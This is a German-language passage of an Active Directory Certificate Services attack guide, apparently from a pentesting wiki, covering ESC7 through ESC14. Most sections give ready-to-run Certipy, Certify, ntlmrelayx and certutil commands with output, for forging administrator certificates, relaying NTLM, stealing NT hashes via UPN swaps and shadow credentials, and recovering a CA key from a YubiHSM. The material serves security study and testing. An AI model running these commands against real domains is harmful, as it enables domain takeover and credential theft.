certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Angriff 3 – Missbrauch der Manage Certificates-Erweiterung (SetExtension)

#### Erläuterung

Zusätzlich zu den klassischen ESC7-Missbrauchsmöglichkeiten (Aktivieren von EDITF-Attributen oder Genehmigen ausstehender Anfragen) hat **Certify 2.0** eine brandneue Primitive offengelegt, für die auf der Enterprise CA lediglich die Rolle *Manage Certificates* (auch **Certificate Manager / Officer**) erforderlich ist.<sup>[[3]](#references)</sup>

Die RPC-Methode `ICertAdmin::SetExtension` kann von jedem Principal ausgeführt werden, der *Manage Certificates* besitzt. Während die Methode traditionell von legitimen CAs verwendet wurde, um Erweiterungen ausstehender Anfragen zu aktualisieren, kann ein Angreifer sie missbrauchen, um eine *nicht standardmäßige* Zertifikatserweiterung (zum Beispiel eine benutzerdefinierte OID für eine *Certificate Issuance Policy* wie `1.1.1.1`) an eine auf Genehmigung wartende Anfrage anzuhängen.

Da die Zielvorlage keinen Standardwert für diese Erweiterung definiert, überschreibt die CA den vom Angreifer kontrollierten Wert NICHT, wenn die Anfrage schließlich ausgestellt wird. Das resultierende Zertifikat enthält daher eine vom Angreifer gewählte Erweiterung, die Folgendes bewirken kann:

* Anforderungen an Application Policy / Issuance Policy anderer verwundbarer Vorlagen erfüllen (was zur Privilegienausweitung führt).
* Zusätzliche EKUs oder Policies einschleusen, die dem Zertifikat in Drittanbietersystemen unerwartetes Vertrauen verleihen.

Kurz gesagt: *Manage Certificates* – bisher als die „weniger mächtige“ Hälfte von ESC7 betrachtet – kann nun für eine vollständige Privilegienausweitung oder langfristige Persistenz genutzt werden, ohne die CA-Konfiguration anzutasten oder das restriktivere Recht *Manage CA* zu benötigen.

#### Missbrauch der Primitive mit Certify 2.0

1. **Eine Zertifikatsanfrage einreichen, die *ausstehend* bleibt.** Dies lässt sich mit einer Vorlage erzwingen, die eine Manager-Genehmigung erfordert:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Eine benutzerdefinierte Erweiterung an die ausstehende Anforderung anhängen** mithilfe des neuen `manage-ca`-Befehls:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Wenn die Vorlage die Erweiterung *Certificate Issuance Policies* nicht bereits definiert, bleibt der oben angegebene Wert nach der Ausstellung erhalten.*

3. **Stellen Sie die Anforderung aus** (falls Ihre Rolle auch über Genehmigungsrechte für *Manage Certificates* verfügt) oder warten Sie darauf, dass ein Operator sie genehmigt. Sobald das Zertifikat ausgestellt wurde, laden Sie es herunter:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Das resultierende Zertifikat enthält nun die bösartige Issuance-Policy-OID und kann für nachfolgende Angriffe verwendet werden (z. B. ESC13, Privilegienausweitung in der Domäne usw.).

> HINWEIS: Derselbe Angriff kann mit Certipy ≥ 4.7 über den Befehl `ca` und den Parameter `-set-extension` ausgeführt werden.

## NTLM Relay zu AD-CS-HTTP-Endpunkten – ESC8

### Erklärung

> [!TIP]
> In Umgebungen, in denen **AD CS installiert ist**, kann ein Angreifer **jeden Computer mit aktivem Spooler-Dienst kompromittieren**, wenn ein **verwundbarer Web Enrollment-Endpunkt vorhanden** ist und mindestens ein **Zertifikat-Template veröffentlicht** wurde, das die Registrierung von **Domänencomputern und Clientauthentifizierung** erlaubt (wie das standardmäßige **`Machine`**-Template).

AD CS unterstützt mehrere **HTTP-basierte Registrierungsverfahren**, die über zusätzliche Serverrollen verfügbar gemacht werden können, die Administratoren installieren können. Diese Schnittstellen für die HTTP-basierte Zertifikatsregistrierung sind anfällig für **NTLM-Relay-Angriffe**. Von einem **kompromittierten Computer aus kann ein Angreifer jedes AD-Konto imitieren, das sich über eingehendes NTLM authentifiziert**. Während der Angreifer das Konto des Opfers imitiert, kann er über diese Webschnittstellen **ein Zertifikat zur Clientauthentifizierung mit den Zertifikat-Templates `User` oder `Machine` anfordern**.

- Die **Web Enrollment-Schnittstelle** (eine ältere ASP-Anwendung unter `http://<caserver>/certsrv/`) verwendet standardmäßig nur HTTP und bietet daher keinen Schutz vor NTLM-Relay-Angriffen. Außerdem lässt sie über ihren HTTP-Authorization-Header ausdrücklich nur NTLM-Authentifizierung zu, wodurch sicherere Authentifizierungsmethoden wie Kerberos nicht verwendet werden können.
- Der **Certificate Enrollment Service** (CES), der **Certificate Enrollment Policy** (CEP) Web Service und der **Network Device Enrollment Service** (NDES) unterstützen standardmäßig Negotiate-Authentifizierung über ihren HTTP-Authorization-Header. Die Negotiate-Authentifizierung **unterstützt sowohl** Kerberos als auch **NTLM**, sodass ein Angreifer bei Relay-Angriffen auf NTLM-Authentifizierung **herabstufen** kann. Obwohl diese Webdienste standardmäßig HTTPS aktivieren, **schützt HTTPS allein nicht vor NTLM-Relay-Angriffen**. Schutz vor NTLM-Relay-Angriffen bei HTTPS-Diensten ist nur möglich, wenn HTTPS mit Channel Binding kombiniert wird. Leider aktiviert AD CS in IIS nicht Extended Protection for Authentication, die für Channel Binding erforderlich ist.<sup>[[6]](#references)</sup>

Ein häufiges **Problem** bei NTLM-Relay-Angriffen ist die **kurze Gültigkeitsdauer von NTLM-Sitzungen** sowie die Tatsache, dass der Angreifer nicht mit Diensten interagieren kann, die **NTLM Signing erfordern**.

Diese Einschränkung lässt sich jedoch umgehen, indem ein NTLM-Relay-Angriff genutzt wird, um ein Zertifikat für den Benutzer zu erhalten. Denn die Gültigkeitsdauer des Zertifikats bestimmt die Sitzungsdauer, und das Zertifikat kann bei Diensten verwendet werden, die **NTLM Signing verlangen**. Anweisungen zur Verwendung eines gestohlenen Zertifikats finden Sie hier:


{{#ref}}
account-persistence.md
{{#endref}}

Eine weitere Einschränkung von NTLM-Relay-Angriffen besteht darin, dass **ein Opferkonto sich gegenüber einem vom Angreifer kontrollierten Computer authentifizieren muss**. Der Angreifer kann entweder warten oder versuchen, diese Authentifizierung **zu erzwingen**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Missbrauch**

`cas` von [**Certify**](https://github.com/GhostPack/Certify) listet **aktivierte HTTP-Endpunkte von AD CS** auf:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die Eigenschaft `msPKI-Enrollment-Servers` wird von Enterprise Certificate Authorities (CAs) zum Speichern von Endpunkten des Certificate Enrollment Service (CES) verwendet. Diese Endpunkte können mit dem Tool **Certutil.exe** geparst und aufgelistet werden:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Missbrauch mit Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Missbrauch mit [Certipy](https://github.com/ly4k/Certipy)

Certipy stellt die Zertifikatsanforderung standardmäßig anhand der Vorlage `Machine` oder `User`, je nachdem, ob der Name des weitergeleiteten Kontos mit `$` endet. Eine alternative Vorlage kann mit dem Parameter `-template` angegeben werden.

Anschließend kann eine Technik wie [PetitPotam](https://github.com/ly4k/PetitPotam) eingesetzt werden, um eine Authentifizierung zu erzwingen. Bei Domänencontrollern muss `-template DomainController` angegeben werden.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Keine Security Extension – ESC9 <a href="#id-5485" id="id-5485"></a>

### Erklärung

Der Wert **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) für **`msPKI-Enrollment-Flag`**, bezeichnet als ESC9, lässt die SID-Erweiterung `szOID_NTDS_CA_SECURITY_EXT` aus einem Zertifikat weg. Ältere ESC9-Beispiele beruhen auf dem Kompatibilitätsverhalten des KDC (`StrongCertificateBindingEnforcement=1`) oder einem separaten schwachen Schannel-Mapping-Pfad. Der Wert `1` ist eine **historische Kompatibilitätseinstellung** und kein aktueller Standardwert: Microsoft zufolge wird die KDC-Überschreibung seit dem Windows-Sicherheitsupdate vom 9. September 2025 nicht mehr unterstützt. Prüfe das tatsächlich installierte Update des Ziels und den verwendeten Authentifizierungsendpunkt, bevor du eine ältere Anleitung anwendest.<sup>[[7]](#references)</sup> Siehe [Microsofts Hinweise zur Einführung](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Zu den Bedingungen, unter denen die Einstellung dieses Flags relevant wird, gehören:

- Bei einem älteren, kompatiblen KDC erlaubt die effektive Zertifikatbindung-Richtlinie das Mapping; alternativ aktiviert der Schannel-Endpunkt separat das UPN-Mapping über das `CertificateMappingMethods`-Bit `0x4`.
- Das Zertifikat ist in der Einstellung `msPKI-Enrollment-Flag` mit dem Flag `CT_FLAG_NO_SECURITY_EXTENSION` gekennzeichnet.
- Im Zertifikat ist eine beliebige EKU für die Clientauthentifizierung angegeben.
- Für ein beliebiges Konto sind `GenericWrite`-Berechtigungen vorhanden, um ein anderes Konto zu kompromittieren.

### Missbrauchsszenario

Angenommen, `John@corp.local` verfügt über `GenericWrite`-Berechtigungen für `Jane@corp.local` und möchte `Administrator@corp.local` kompromittieren. Die Zertifikatvorlage `ESC9`, für die `Jane@corp.local` eine Registrierungsberechtigung hat, ist in ihrer Einstellung `msPKI-Enrollment-Flag` mit dem Flag `CT_FLAG_NO_SECURITY_EXTENSION` konfiguriert.

Zunächst wird dank Johns `GenericWrite`-Berechtigung der Hash von `Jane` mithilfe von Shadow Credentials erlangt:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Anschließend wird `Jane`'s `userPrincipalName` in `Administrator` geändert, wobei der Domänenteil @corp.local absichtlich weggelassen wird:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Diese Änderung verstößt nicht gegen Einschränkungen, da `Administrator@corp.local` weiterhin als `userPrincipalName` von `Administrator` unterscheidbar bleibt.

Anschließend wird die als verwundbar gekennzeichnete Zertifikatvorlage `ESC9` von `Jane` angefordert:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Es wird festgestellt, dass der `userPrincipalName` des Zertifikats `Administrator` widerspiegelt, ohne jegliche „object SID“.

Der `userPrincipalName` von `Jane` wird anschließend auf ihren ursprünglichen Wert `Jane@corp.local` zurückgesetzt:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Der Versuch, sich mit dem ausgestellten Zertifikat zu authentifizieren, liefert nun den NT-Hash von `Administrator@corp.local`. Aufgrund der fehlenden Domänenangabe im Zertifikat muss der Befehl `-domain <domain>` enthalten:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Schwache Zertifikatzuordnungen - ESC10

### Erklärung

Unter ESC10 werden häufig zwei separate Richtlinien für die Zertifikatzuordnung besprochen. Lies die Einstellung auf dem Endpunkt aus, der die betreffende Authentifizierung tatsächlich verarbeitet:

- Schannels `CertificateMappingMethods` unter `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` steuert die TLS-Clientzertifikatzuordnung auf dem Anwendungsserver. Das UPN-Bit ist `0x4`; auf aktualisierten Systemen ist der Standardwert `0x18` (`0x8 | 0x10`).
- `StrongCertificateBindingEnforcement` des KDC unter `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` steuerte früher die Kompatibilität der Kerberos-Zertifikatbindung. Der Wert `1` ist kein verlässlicher aktueller Standardwert, und Microsoft hat die Unterstützung für diese Überschreibung mit dem Windows-Sicherheitsupdate vom 9. September 2025 eingestellt. Sein Status beschreibt Schannels UPN-Zuordnung nicht.<sup>[[7]](#references)</sup>

**Fall 1**

Früher wurde `StrongCertificateBindingEnforcement=0` von älteren KDCs berücksichtigt. Überprüfe den Update-Stand, da diese Überschreibung auf aktuellen, gepatchten Systemen nicht mehr unterstützt wird.

**Fall 2**

Wenn auf dem Schannel-Clientzertifikat-Endpunkt das UPN-Bit (`0x4`) von `CertificateMappingMethods` aktiviert ist. Dies ist eine separate Einstellung von der starken KDC-Bindung und setzt weiterhin ein ausstellbares Clientauthentifizierungszertifikat sowie die effektive Kontrolle über das zugeordnete Kontoattribut voraus.

### Missbrauchsfall 1

In einer älteren Bereitstellung, in der der KDC `StrongCertificateBindingEnforcement=0` noch berücksichtigt, kann die Kontrolle über den `userPrincipalName` eines Kontos Teil eines schwachen Zuordnungspfads zu einem anderen Konto sein. Die erforderliche Zertifikatausstellung, Zuordnung, Zielidentität und erfolgreiche Authentifizierung müssen separat geprüft werden; eine `GenericWrite`-ACE oder ein Registrierungswert allein belegt keine Kontoübernahme.

Hat ein Angreifer beispielsweise `GenericWrite`-Berechtigungen für `Jane@corp.local`, zielt er darauf ab, `Administrator@corp.local` zu kompromittieren. Das Vorgehen ähnelt ESC9 und ermöglicht die Verwendung beliebiger Zertifikatvorlagen.

Zunächst wird Janes Hash mithilfe von Shadow Credentials abgerufen, wobei die `GenericWrite`-Berechtigung ausgenutzt wird.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Anschließend wird `userPrincipalName` von `Jane` in `Administrator` geändert. Dabei wird der Teil `@corp.local` absichtlich weggelassen, um eine Constraint-Verletzung zu vermeiden.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Anschließend wird als `Jane` ein Zertifikat angefordert, das die Clientauthentifizierung ermöglicht. Dabei wird die Standardvorlage `User` verwendet.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` von `Jane` wird anschließend auf den ursprünglichen Wert `Jane@corp.local` zurückgesetzt.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Die Authentifizierung mit dem erhaltenen Zertifikat liefert den NT-Hash von `Administrator@corp.local`. Da das Zertifikat keine Domäneninformationen enthält, muss die Domäne im Befehl angegeben werden.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Missbrauchsfall 2

Wenn `CertificateMappingMethods` das `UPN`-Bitflag (`0x4`) enthält, kann ein Konto A mit `GenericWrite`-Berechtigungen jedes Konto B kompromittieren, dem die Eigenschaft `userPrincipalName` fehlt. Dazu gehören auch Maschinenkonten und der integrierte Domänenadministrator `Administrator`.

Ziel ist hier, `DC$@corp.local` zu kompromittieren. Dazu wird zunächst über Shadow Credentials der Hash von `Jane` beschafft, wobei `GenericWrite` ausgenutzt wird.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

Der `userPrincipalName` von `Jane` wird dann auf `DC$@corp.local` gesetzt.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Ein Zertifikat zur Clientauthentifizierung wird unter dem Namen `Jane` mit der Standardvorlage `User` angefordert.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'s `userPrincipalName` wird nach diesem Prozess auf seinen ursprünglichen Wert zurückgesetzt.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Zur Authentifizierung über Schannel wird Certipys Option `-ldap-shell` verwendet. Die erfolgreiche Authentifizierung wird als `u:CORP\DC$` angezeigt.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Über die LDAP-Shell ermöglichen Befehle wie `set_rbcd` Angriffe mit Resource-Based Constrained Delegation (RBCD), die potenziell zur Kompromittierung des Domain Controllers führen.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Diese Schwachstelle betrifft auch jedes Benutzerkonto ohne `userPrincipalName` oder bei dem dieser nicht mit dem `sAMAccountName` übereinstimmt. Das standardmäßige `Administrator@corp.local` ist aufgrund seiner erhöhten LDAP-Berechtigungen und des standardmäßig fehlenden `userPrincipalName` ein besonders attraktives Ziel.

## Relaying NTLM to ICPR - ESC11

### Erklärung

Wenn der CA-Server nicht mit `IF_ENFORCEENCRYPTICERTREQUEST` konfiguriert ist, können NTLM-Relay-Angriffe ohne Signierung über den RPC-Dienst durchgeführt werden. [Referenz hier](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Mit `certipy` kannst du ermitteln, ob `Enforce Encryption for Requests` deaktiviert ist. certipy zeigt dann `ESC11`-Schwachstellen an.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Missbrauchsszenario

Dazu muss ein Relay-Server eingerichtet werden:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Hinweis: Für Domänencontroller müssen wir `-template` in DomainController angeben.

Oder mit [sploutchys Fork von impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access auf ADCS-CA mit YubiHSM – ESC12

### Erklärung

Administratoren können die Zertifizierungsstelle so einrichten, dass sie auf einem externen Gerät wie dem „Yubico YubiHSM2“ gespeichert wird.

Wenn ein USB-Gerät über einen USB-Port mit dem CA-Server verbunden ist oder – falls es sich beim CA-Server um eine virtuelle Maschine handelt – über einen USB-Geräteserver, ist für den Key Storage Provider ein Authentifizierungsschlüssel (manchmal auch als „Passwort“ bezeichnet) erforderlich, um Schlüssel im YubiHSM zu generieren und zu verwenden.

Dieser Schlüssel bzw. dieses Passwort ist in der Registry unter `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` im Klartext gespeichert.

Referenz: [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse-Szenario

Wenn der private Schlüssel der CA auf einem physischen USB-Gerät gespeichert ist und du Shell-Zugriff erhalten hast, kann der Schlüssel wiederhergestellt werden.

Zuerst musst du das CA-Zertifikat beschaffen (es ist öffentlich) und dann:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Verwenden Sie abschließend den Befehl certutil `-sign`, um mithilfe des CA-Zertifikats und seines privaten Schlüssels ein neues beliebiges Zertifikat zu fälschen.

## OID Group Link Abuse - ESC13

### Erklärung

Mit dem Attribut `msPKI-Certificate-Policy` kann die Ausstellungsrichtlinie zur Zertifikatvorlage hinzugefügt werden. Die für Ausstellungsrichtlinien zuständigen `msPKI-Enterprise-Oid`-Objekte lassen sich im Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) des PKI-OID-Containers finden. Über das Attribut `msDS-OIDToGroupLink` dieses Objekts kann eine Richtlinie mit einer AD-Gruppe verknüpft werden. Dadurch kann ein System einen Benutzer, der das Zertifikat vorlegt, so autorisieren, als wäre er Mitglied der Gruppe. [Referenz hier](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Mit anderen Worten: Wenn ein Benutzer zum Registrieren eines Zertifikats berechtigt ist und das Zertifikat mit einer OID-Gruppe verknüpft ist, kann er die Berechtigungen dieser Gruppe erben.

Verwenden Sie [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), um OIDToGroupLink zu finden:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Missbrauchsszenario

Finde eine Benutzerberechtigung, die sich mit `certipy find` oder `Certify.exe find /showAllPermissions` nutzen lässt.

Wenn `John` die Berechtigung hat, ein Zertifikat für `VulnerableTemplate` zu beantragen, kann der Benutzer die Privilegien der Gruppe `VulnerableGroup` übernehmen.

Dazu muss er lediglich die Vorlage angeben. Er erhält dann ein Zertifikat mit `OIDToGroupLink`-Rechten.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Missbrauch expliziter Zertifikatzuordnungen — ESC14

### Erklärung

Die Beschreibung unter https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ist bemerkenswert ausführlich. Nachfolgend ein Zitat des Originaltexts.<sup>[[14]](#references)</sup>

ESC14 befasst sich mit Schwachstellen, die durch „schwache explizite Zertifikatzuordnungen“ entstehen, insbesondere durch den Missbrauch oder die unsichere Konfiguration des Attributs `altSecurityIdentities` bei Active Directory-Benutzer- oder Computerkonten. Mit diesem mehrwertigen Attribut können Administratoren X.509-Zertifikate manuell einem AD-Konto für Authentifizierungszwecke zuordnen. Wenn diese expliziten Zuordnungen vorhanden sind, können sie die standardmäßige Zertifikatzuordnungslogik überschreiben, die sich typischerweise auf UPNs oder DNS-Namen im SAN des Zertifikats oder auf die in der Sicherheitserweiterung `szOID_NTDS_CA_SECURITY_EXT` eingebettete SID stützt.

Eine Zuordnung ist „schwach“, wenn der im Attribut `altSecurityIdentities` verwendete Zeichenfolgenwert zur Identifizierung eines Zertifikats zu allgemein oder leicht zu erraten ist, auf nicht eindeutigen Zertifikatsfeldern basiert oder leicht fälschbare Zertifikatskomponenten verwendet. Kann ein Angreifer ein Zertifikat erhalten oder erstellen, dessen Attribute einer solchen schwach definierten expliziten Zuordnung für ein privilegiertes Konto entsprechen, kann er sich mit diesem Zertifikat als dieses Konto authentifizieren und es imitieren.

Beispiele für potenziell schwache Zuordnungszeichenfolgen in `altSecurityIdentities` sind:

- Zuordnung ausschließlich über einen häufig vorkommenden Subject Common Name (CN), z. B. `X509:<S>CN=SomeUser`. Ein Angreifer kann möglicherweise aus einer weniger sicheren Quelle ein Zertifikat mit diesem CN erhalten.
- Verwendung zu allgemeiner Issuer Distinguished Names (DNs) oder Subject DNs ohne zusätzliche Einschränkung, etwa durch eine bestimmte Seriennummer oder einen Subject Key Identifier, z. B. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Verwendung anderer vorhersehbarer Muster oder nicht kryptografischer Kennungen, die ein Angreifer in einem Zertifikat verwenden kann, das er rechtmäßig erhalten oder fälschen kann (wenn er eine CA kompromittiert oder eine anfällige Vorlage wie bei ESC1 gefunden hat).

Das Attribut `altSecurityIdentities` unterstützt verschiedene Zuordnungsformate, zum Beispiel:

- `X509:<I>IssuerDN<S>SubjectDN` (Zuordnung anhand des vollständigen Issuer- und Subject-DN)
- `X509:<SKI>SubjectKeyIdentifier` (Zuordnung anhand des Werts der Subject Key Identifier-Erweiterung des Zertifikats)
- `X509:<SR>SerialNumberBackedByIssuerDN` (Zuordnung anhand der Seriennummer, implizit eingeschränkt durch den Issuer-DN) – dies ist kein Standardformat; üblicherweise lautet es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (Zuordnung anhand eines RFC822-Namens, typischerweise einer E-Mail-Adresse, aus dem SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (Zuordnung anhand eines SHA1-Hashs des unverarbeiteten öffentlichen Schlüssels des Zertifikats – im Allgemeinen stark)

Die Sicherheit dieser Zuordnungen hängt von den darin verwendeten Kennungen ab. Microsoft stuft Zuordnungen anhand von E-Mail-Adressen oder Betreffnamen, einschließlich `X509:<RFC822>`, als **schwach** ein. Im Modus „Full Enforcement“ wird ein Zertifikat ohne starke Zuordnung abgelehnt; das Windows-Sicherheitsupdate vom September 2025 hat die Möglichkeit entfernt, zum Kompatibilitätsmodus zurückzukehren. Eine schwache Zuordnung allein ist daher kein verlässlicher aktueller Weg zur Identitätsvortäuschung. Prüfe vor der Bewertung eines Szenarios mit schwacher Zuordnung den tatsächlichen Patchstand des Domänencontrollers und das Verhalten bei der Zertifikatzuordnung. Schreibzugriff auf `altSecurityIdentities` ist ein separater Ansatzpunkt: Ein Angreifer mit einem geeigneten vertrauenswürdigen Zertifikat kann möglicherweise eine **starke** explizite Zuordnung hinzufügen, abhängig von den effektiven Berechtigungen und der Zertifikatvalidierung. Siehe [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) und [die ESC14-Forschung](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Auch Fehler bei der Zertifikatauthentifizierung müssen diagnostiziert werden: Ein deaktiviertes Zielkonto oder ein abgelaufenes Kennwort kann die Anmeldung verhindern, selbst wenn das Zertifikat weiterhin gültig ist.

### Missbrauchsszenario

ESC14 zielt auf **explizite Zertifikatzuordnungen** in Active Directory (AD) ab, insbesondere auf das Attribut `altSecurityIdentities`. Wenn dieses Attribut gesetzt ist (absichtlich oder aufgrund einer Fehlkonfiguration), können Angreifer Konten imitieren, indem sie Zertifikate vorlegen, die der Zuordnung entsprechen.

#### Szenario A: Angreifer kann `altSecurityIdentities` bearbeiten

 **Voraussetzung**: Der Angreifer hat Schreibberechtigungen für das Attribut `altSecurityIdentities` des Zielkontos oder die Berechtigung, diese zu gewähren, in Form einer der folgenden Berechtigungen für das AD-Zielobjekt:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Szenario B: Zielkonto hat eine schwache Zuordnung über X509RFC822 (E-Mail)

- **Historische/bedingte Voraussetzung**: Das Zielkonto hat eine schwache X509RFC822-Zuordnung in `altSecurityIdentities`, der Angreifer kann das Attribut `mail` eines Enrollment-Benutzers bearbeiten, und eine geeignete Vorlage nimmt diese E-Mail-Adresse in ein Zertifikat zur Clientauthentifizierung auf, ohne dass eine widersprüchliche SID-Bindung vorliegt. Die Authentifizierung setzt außerdem eine Umgebung voraus, die die schwache Zuordnung noch akzeptiert; „Full Enforcement“ lehnt Zertifikatszuordnungen ab, die ausschließlich schwach sind. Ein beschreibbares Attribut `mail` ist allein nur ein Ansatzpunkt.
#### Szenario C: Zielkonto hat eine X509IssuerSubject-Zuordnung

